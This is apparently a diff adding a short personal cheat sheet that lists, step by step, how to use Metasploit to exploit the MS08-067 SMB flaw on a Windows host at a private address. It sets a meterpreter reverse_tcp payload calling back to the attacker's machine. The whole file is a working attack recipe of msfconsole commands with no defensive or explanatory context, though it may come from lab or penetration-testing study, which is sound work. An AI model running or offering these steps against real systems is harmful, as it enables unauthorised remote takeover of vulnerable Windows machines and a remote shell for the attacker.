@@ -1,0 +1,15 @@
+1. find target ip  
+2. scan t for open ports  
+3. find vulerablility in os
+4. start msfconsole
+5. use exploit/windows/smb/ms08_067_netapi  
+6. info
+7. show options
+8. set RHOST 10.0.0.3 
+9. set RPORT 445 same as open port found in scan  
+10. select payload 
+11. set payload windows/meterpreter/reverse_tcp
+12. show options
+13. set LHOST your machine 10.0.0.5
+14. set LPORT any port
+15. exploit 
